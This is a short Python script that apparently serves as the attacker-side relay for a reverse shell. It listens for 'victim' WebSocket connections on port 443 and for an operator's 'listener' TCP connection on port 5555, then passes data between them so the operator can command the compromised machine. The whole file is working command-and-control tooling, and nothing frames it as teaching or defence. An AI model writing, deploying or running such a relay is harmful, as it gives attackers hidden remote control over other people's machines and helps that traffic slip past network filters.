import websockets
import asyncio


# Handle victim side connection.
async def victim_handle(websocket):
    global victim
    victim = websocket

    # Store victim's connected ip and port.
    ip, port = websocket.remote_address

    print(f'[+] Victim {ip}:{port} connected')

    try:
        async for msg in websocket:

            if reader:
                writer.write(msg)
                await writer.drain()

    except:
        print('[+] Victim disconnected!')


# Handle listener side connection.
async def listener_handle():

    # Use to transfer data to victim side.
    async def data_transfer(read, write):

        global reader
        global writer

        reader = read
        writer = write
        addr = writer.get_extra_info('peername')
        print(f'[+] Listener {addr} connected')

        try:
            while True:

                data = await reader.read(10000000000)

                if not data:
                    break

                await victim.send(data)
        except:
            print('[+] Listener disconnected!')

    server = await asyncio.start_server(data_transfer, '0.0.0.0', 5555)

    async with server:
        await server.serve_forever()


# Handle both victim and listener connections.
async def main():

    # Use to run victim and listener handle asynchronously.
    # type: ignore
    await asyncio.gather(websockets.serve(victim_handle, '0.0.0.0', 443), listener_handle())

asyncio.run(main())
